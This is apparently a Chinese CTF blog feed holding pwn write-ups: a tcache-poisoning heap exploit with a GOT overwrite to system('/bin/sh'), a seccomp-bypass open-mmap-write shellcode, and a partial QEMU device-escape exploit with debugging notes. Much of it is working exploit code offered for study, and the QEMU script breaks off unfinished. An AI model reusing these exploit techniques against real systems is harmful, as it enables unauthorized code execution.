<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload1 = payload2 = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">alloc(<span class="number">0</span>,payload1,payload2)</span><br><span class="line">alloc(<span class="number">1</span>,payload1,payload2)     <span class="comment"># 这里申请了chunk1其实对这一步没啥用，下一步申请也行</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;choose: &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">heap_addr = u64(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[-<span class="number">5</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) <span class="comment"># 注：这里我没想到更好的方法，heap_addr有可能是三字节</span></span><br><span class="line">															  也有可能是四字节，所以后续如果报错多试几次就行。</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;heap_addr   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">payload = p64(<span class="number">0</span>)</span><br><span class="line">io.sendafter(<span class="string">&#x27;name is: &#x27;</span>, payload)</span><br></pre></td></tr></table></figure></li>
<li>通过tcache poisoning在heapList段伪造chunk2， <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">1</span>)                        <span class="comment"># 把上一步申请的chunk1放进tcachebin</span></span><br><span class="line"><span class="comment"># gdb.attach(io)                 # 通过bins命令可以看到现在是tcachebin_entries[3] -&gt; chunk1 -&gt; chunk0</span></span><br><span class="line">payload = p64(heap_addr + <span class="number">0x290</span>) <span class="comment"># 改为tcachebin_entries[3] -&gt; chunk1 -&gt; (heap_addr + 0x290)</span></span><br><span class="line">fill(<span class="number">1</span>,payload)                  </span><br><span class="line">alloc(<span class="number">2</span>,payload1,payload2)       <span class="comment"># 把chunk1申请出来，bins变为tcachebin_entries[3] -&gt; (heap_addr + 0x290)</span></span><br></pre></td></tr></table></figure></li>
<li>申请chunk2，同时把puts_got-8写进heapList[0]，然后通过modify函数中的puts泄露libc（笔误:
下图“加上下一个chunk的prev_size构成了chunk2”中的"chunk2"应为chunk3）
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload1 = p64(puts_got-<span class="number">8</span>)</span><br><span class="line">alloc(<span class="number">3</span>,payload1,payload2)</span><br><span class="line">fill(<span class="number">3</span>,payload1)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;choose: &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;this order is: &#x27;</span>)</span><br><span class="line">puts_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure> <img src="/pic/Pasted%20image%2020230827003153.png" />
读者也可以通过<code>x/20gx 0x404020</code>来查看Libc中free的下一个地址是不是puts<br />
</li>
<li>修改"puts_got-8"指向的地址，即free_libc_addr，我们将其修改为sys_libc_addr
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr  = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr    ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line">payload1 = p64(sys_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;name is: &#x27;</span>, payload1)</span><br></pre></td></tr></table></figure></li>
<li>找"ptr没有被修改"&amp;"chunk没有被free过"的chunk2存一下/bin/sh然后free掉他，getshell！
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">fill(<span class="number">2</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="x04-完整exp">0x04 完整EXP</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">domain_name = <span class="string">&#x27;101.200.234.115&#x27;</span></span><br><span class="line">port = <span class="number">42490</span></span><br><span class="line">file = <span class="string">&#x27;./takeway&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = remote(domain_name,port)</span></span><br><span class="line">io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./takeway&#x27;</span>)</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">index,name,remark</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;choose: &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">  io.sendafter(<span class="string">&#x27;name: &#x27;</span>, name)</span><br><span class="line">  io.sendafter(<span class="string">&#x27;remark: &#x27;</span>, remark)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;choose: &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index,name</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;choose: &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">  io.sendafter(<span class="string">&#x27;name is: &#x27;</span>, name)</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line">payload1 = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">payload2 = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">alloc(<span class="number">0</span>,payload1,payload2)</span><br><span class="line">alloc(<span class="number">1</span>,payload1,payload2)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;choose: &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">heap_addr = u64(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[-<span class="number">5</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;heap_addr   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">payload = p64(<span class="number">0</span>)</span><br><span class="line">io.sendafter(<span class="string">&#x27;name is: &#x27;</span>, payload)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">payload = p64(heap_addr + <span class="number">0x290</span>)</span><br><span class="line">fill(<span class="number">1</span>,payload)</span><br><span class="line">alloc(<span class="number">2</span>,payload1,payload2)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload1 = p64(puts_got-<span class="number">8</span>)</span><br><span class="line">alloc(<span class="number">3</span>,payload1,payload2)</span><br><span class="line">fill(<span class="number">3</span>,payload1)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;choose: &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;this order is: &#x27;</span>)</span><br><span class="line">puts_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr  = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr    ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line">payload1 = p64(sys_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;name is: &#x27;</span>, payload1)</span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">fill(<span class="number">2</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="x05-总结">0x05 总结</h1>
<p>这题太遗憾了...最后也没做出来。不过做一窍不通的题收获才最大。<br />
做这道题之前还从来没接触过2.26版本以上的堆题，所以对tcachebin完全不了解。<br />
对tcachebin的第一印象如下:<br />
1. 概述<br />
1. 0x10~0x410（貌似是）的chunk 2. LIFO 3.
大小只有7，free满以后再free就会放到对应的其他bin中 4.
2.28及以下的libc不检测double free 2. 伪造chunk 1.
安全性比fastbin还差，不检验fd指向chunk的size直接申请 3. leak堆地址 1.
2.31及以下libc没有key加密，可以直接leak出对应大小的tcachebin_entry
目前就想到这些，这次多亏队友带飞，进半决赛了XD</p>
]]></content>
      <categories>
        <category>competition</category>
      </categories>
      <tags>
        <tag>Heap</tag>
        <tag>WriteUp - Reverse - Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>comp - 2024VNCTF_pwn_wp</title>
    <url>/2024/02/17/comp%20-%202024VNCTF_pwn_wp/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
没注意到今天还有一个 vnctf😭赛后复盘一下
</blockquote>
<span id="more"></span>
<h1 id="pwn">pwn</h1>
<h2 id="shellcode">shellcode</h2>
<p>签到题，禁用了 execve 相关函数，还禁用了所有与 read 和 socket send
相关的函数，也就是 ORW 缺 R</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x11 0xc000003e  if (A != ARCH_X86_64) goto 0019</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x0e 0xffffffff  if (A != 0xffffffff) goto 0019</span><br><span class="line"> 0005: 0x15 0x0d 0x00 0x00000000  if (A == read) goto 0019</span><br><span class="line"> 0006: 0x15 0x0c 0x00 0x00000011  if (A == pread64) goto 0019</span><br><span class="line"> 0007: 0x15 0x0b 0x00 0x00000013  if (A == readv) goto 0019</span><br><span class="line"> 0008: 0x15 0x0a 0x00 0x00000028  if (A == sendfile) goto 0019</span><br><span class="line"> 0009: 0x15 0x09 0x00 0x0000002c  if (A == sendto) goto 0019</span><br><span class="line"> 0010: 0x15 0x08 0x00 0x0000002e  if (A == sendmsg) goto 0019</span><br><span class="line"> 0011: 0x15 0x07 0x00 0x0000003b  if (A == execve) goto 0019</span><br><span class="line"> 0012: 0x15 0x06 0x00 0x00000127  if (A == preadv) goto 0019</span><br><span class="line"> 0013: 0x15 0x05 0x00 0x00000142  if (A == execveat) goto 0019</span><br><span class="line"> 0014: 0x15 0x04 0x00 0x00000147  if (A == preadv2) goto 0019</span><br><span class="line"> 0015: 0x15 0x03 0x00 0x000001a9  if (A == 0x1a9) goto 0019</span><br><span class="line"> 0016: 0x15 0x02 0x00 0x000001aa  if (A == 0x1aa) goto 0019</span><br><span class="line"> 0017: 0x15 0x01 0x00 0x000001ab  if (A == 0x1ab) goto 0019</span><br><span class="line"> 0018: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0019: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>
<p>但是这种不是<code>!=</code>的 seccomp 代表了有很多其他的可能性。</p>
<p>我们知道 mmap 可以不通过 IO
直接将磁盘文件映射到内存空间当中，所以本题我们考虑用 open - mmap - write
的方式来打印 flag 文件</p>
<p>但这题也卡了我一个小时，主要卡在 mmap 的 flags 上。最开始 flags =
0x22 时 mmap 即使成功分配内存也无法将文件内容映射到内存中，最后调整为
flags=0x2 才成功映射</p>
<p>以及通过这题我还学到了 mmap 在分配内存时可以将 addr 设置为 0，这样
mmap 会自动寻找一块合适的内存，而我们知道 rax 是 mmap
的返回值，所以我们可以通过控制 rax 来获取 mmap 申请的内存地址。</p>
<p>我这里没有远程环境，不确定这种做法是否能得到 flag</p>
<p>况且之前的 NSSCTF Round18 还出现了本地能打通远程打不通的情况，可能是
flag 文件不跟 vuln 文件在同一个文件夹下</p>
<p>exp 如下</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">ip = <span class="string">&#x27;&#x27;</span>.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">file = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="comment"># io = remote(ip[0],int(ip[1]))</span></span><br><span class="line">io = process(file)</span><br><span class="line">elf = ELF(file)</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line">shellcode_open  = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag.txt&quot;</span>)</span><br><span class="line">shellcode_mmap  = shellcraft.mmap(<span class="number">0</span>,<span class="number">0x80</span>,<span class="number">7</span>,<span class="number">0x2</span>,<span class="number">3</span>,<span class="number">0</span>)</span><br><span class="line">shellcode_write = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rsi,rax</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor edx, edx</span></span><br><span class="line"><span class="string">mov dl, 0x80</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = shellcode_open</span><br><span class="line">shellcode += shellcode_mmap</span><br><span class="line">shellcode += shellcode_write</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="escape_langlang_mountain2">escape_langlang_mountain2</h2>
<p>QEMU 逃逸，第一次做 ;(</p>
<p>读
<code>Dockerfile</code>，了解到它在搭起环境以后启动了<code>start.sh</code>，</p>
<p>再读 <code>start.sh</code>，了解到它启动了 <code>xinetd</code>
程序</p>
<p>再读 <code>xinetd</code>，这个程序的主要作用是监听指定
port，并根据预先定义好的配置来启动相应服务。可以看到
<code>server_args</code> 处启动了 <code>run.sh</code></p>
<p>再读 <code>run.sh</code>，发现它用 QEMU 起了一个程序，通过
<code>-device vn</code> 我们可以知道 <code>vn</code> 是作为 QEMU
中的一个 <code>pci设备</code> 存在的。</p>
<p>通过 IDA 查找字符串 <code>vn_</code> 可以找到
<code>vn_instance_init</code>，跟进调用
<code>字符串vn_instance_init</code> 的
<code>函数vn_instance_init</code>，再按 x 查看
<code>函数vn_instance_init</code> 的引用，可以看到下面还有一个
<code>vn_class_init</code> ，反汇编后看到</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">vn_class_init</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = PCI_DEVICE_CLASS_23(a1);</span><br><span class="line">  *(_QWORD *)(result + <span class="number">176</span>) = pci_vn_realize;</span><br><span class="line">  *(_QWORD *)(result + <span class="number">184</span>) = <span class="number">0LL</span>;</span><br><span class="line">  *(_WORD *)(result + <span class="number">208</span>) = <span class="number">0x1234</span>; <span class="comment">// 厂商ID (Vendor ID)</span></span><br><span class="line">  *(_WORD *)(result + <span class="number">210</span>) = <span class="number">0x2024</span>; <span class="comment">// 设备ID (Device ID)</span></span><br><span class="line">  *(_BYTE *)(result + <span class="number">212</span>) = <span class="number">0x10</span>;</span><br><span class="line">  *(_WORD *)(result + <span class="number">214</span>) = <span class="number">0xFF</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过厂商ID和设备ID，我们可以判断下列 pci 设备中
<code>00:04.0 Class 00ff: 1234:2024</code> 就是我们要找的
<code>vn</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/sys/devices/pci0000:00/0000:00:04.0 # lspci</span><br><span class="line">lspci</span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:04.0 Class 00ff: 1234:2024</span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 0200: 8086:100e</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br></pre></td></tr></table></figure>
<p>进而去<code>/sys/devices/pci0000:00/0000:00:04.0</code>
目录查看该设备 <code>mmio</code> 与 <code>pmio</code> 的注册情况</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/sys/devices/pci0000:00/0000:00:04.0 # ls -al</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">-r--r--r--    1 0        0             4096 Feb 18 12:18 resource</span><br><span class="line">-rw-------    1 0        0             4096 Feb 18 12:18 resource0</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>有了 resource0 这个文件，我们就可以再脚本里 <code>mmap</code>
做虚拟地址映射。</p>
<p>并且我们可以看到 <code>vn</code> 这个设备只注册了
<code>mmio</code>，那就考虑用 <a
href="https://ctf-wiki.org/pwn/virtualization/qemu/exploitation/intro/#_3">mmio攻击（点击这里了解
mmio 运行原理）</a> ，先写一部分脚本</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// exp.c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * mmio;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">uint32_t</span> *)(mmio + addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint64_t</span> val)</span>&#123;</span><br><span class="line">    *(<span class="type">uint64_t</span> *)(mmio + addr) = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">read_val</span><span class="params">(<span class="type">int</span> offset)</span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> val;</span><br><span class="line">    mmio_write(<span class="number">0x10</span>, offset + <span class="number">4</span>);</span><br><span class="line">    val = mmio_read(<span class="number">0x20</span>);</span><br><span class="line">    mmio_write(<span class="number">0x10</span>, offset);</span><br><span class="line">    val = (val &lt;&lt; <span class="number">32</span>) + mmio_read(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_val</span><span class="params">(<span class="type">int</span> offset, <span class="type">uint64_t</span> val)</span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x20</span>, ((<span class="type">uint64_t</span>)offset &lt;&lt; <span class="number">32</span>) + (val &amp; <span class="number">0xffffffff</span>));</span><br><span class="line">    mmio_write(<span class="number">0x20</span>, ((<span class="type">uint64_t</span>)(offset + <span class="number">4</span>) &lt;&lt; <span class="number">32</span>) + (val &gt;&gt; <span class="number">32</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后，本题的核心在于伪造 MemoryRegion
结构体，由于上述部分我也不清楚为什么要这样去 read 和
write，所以还需要补很多基础知识 (2.18晚)</p>
<p>花了一整个晚上的时间把 qemu 调试搞定了，明天找一下 QEMU
相关部分的源码读一下 (2.19晚)</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 记录一下如何用 docker 调试 QEMU</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先将 exp.c 静态编译为二进制文件</span></span><br><span class="line">gcc exp.c --static -o exp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后解包 rootfs.cpio，参考https://www.jianshu.com/p/f08e34cf08ad 的“调试”部分</span></span><br><span class="line">hen rootfs.cpio</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 exp 放入 /core/usr/bin 中</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新打包 roortfs.cpio</span></span><br><span class="line">gen rootfs.cpio</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改 run.sh </span></span><br><span class="line">vim run.sh</span><br><span class="line"><span class="comment"># #!/bin/sh</span></span><br><span class="line"><span class="comment"># ./qemu-system-x86_64 \</span></span><br><span class="line"><span class="comment">#     -L ./pc-bios \</span></span><br><span class="line"><span class="comment">#     -m 128M \</span></span><br><span class="line"><span class="comment">#     -append &quot;console=ttyS0&quot; \</span></span><br><span class="line"><span class="comment">#     -kernel bzImage \</span></span><br><span class="line"><span class="comment">#     -initrd rootfs.cpio \</span></span><br><span class="line"><span class="comment">#     -device vn \</span></span><br><span class="line"><span class="comment">#     -nographic \</span></span><br><span class="line"><span class="comment">#     -no-reboot \</span></span><br><span class="line"><span class="comment">#     -monitor /dev/null \</span></span><br><span class="line"><span class="comment">#     -smp 2 \</span></span><br><span class="line"><span class="comment">#     -s -S</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改 Dockerfile，在创建容器时安装 qemu-system-x86 gdb，这一步其实在 容器的shell里也能install，可以跳过</span></span><br><span class="line">vim Dockerfile <span class="comment"># 下面内容只是 RUN 部分，其他部分不动</span></span><br><span class="line"><span class="comment"># RUN sed -i &quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot; /etc/apt/sources.list &amp;&amp; \</span></span><br><span class="line"><span class="comment">#     apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span></span><br><span class="line"><span class="comment">#     apt-get install -y lib32z1 xinetd \</span></span><br><span class="line"><span class="comment">#                        libpixman-1-dev libepoxy-dev libpng16-16 libjpeg8-dev \</span></span><br><span class="line"><span class="comment">#                        libfdt-dev libnuma-dev libglib2.0-dev \</span></span><br><span class="line"><span class="comment">#                        libgtk-3-dev libasound2-dev libcurl4 qemu-system-x86 gdb</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># build 与 启动容器</span></span><br><span class="line">docker-compose build</span><br><span class="line">docker start vnctf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果已经提前 docker-compose 好了，则可以直接通过 docker cp 来修改内部文件</span></span><br><span class="line">docker <span class="built_in">cp</span> /path/to/file container_name:/whatever/path/you/want/to/file</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动tmux，分页记为 pane1 和 pane2</span></span><br><span class="line"><span class="comment"># pane1:</span></span><br><span class="line">docker <span class="built_in">exec</span> -ti vnctf /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># pane2:</span></span><br><span class="line">docker <span class="built_in">exec</span> -ti vnctf /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># pane1:</span></span><br><span class="line">./run.sh <span class="comment"># 这里运行以后应该是什么也不会出现</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pane2:</span></span><br><span class="line">ps -ax |grep <span class="string">&quot;qemu&quot;</span> <span class="comment"># 这一步获取 qemu 的进程号PID,用于 (gdb) attach PID</span></span><br><span class="line">gdb ./qemu-system-x86_64</span><br><span class="line">(gdb) attach PID <span class="comment"># 比如 (gdb) attach 406</span></span><br><span class="line">(gdb) <span class="built_in">continue</span> <span class="comment"># 输入完以后看一眼 pane1，如果qemu启动了就等qemu启动</span></span><br><span class="line">               <span class="comment"># 如果没启动就继续输入 (gdb) continue</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pane1:</span></span><br><span class="line"><span class="comment"># 此时 QEMU 正常运行，我们可以在里面输入一些命令比如ls等查看</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pane2:</span></span><br><span class="line">(gdb) b vn_mmio_read</span><br><span class="line"></span><br><span class="line"><span class="comment"># pane1:</span></span><br><span class="line"><span class="built_in">cd</span> /usr/bin <span class="comment"># 这里是前面解包后的时候 exp 放入的文件夹</span></span><br><span class="line">./exp</span><br><span class="line"></span><br><span class="line"><span class="comment"># pane2:</span></span><br><span class="line">此时就可以开始调试了</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// exp.c</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    mmio         = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>competition</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
</search>
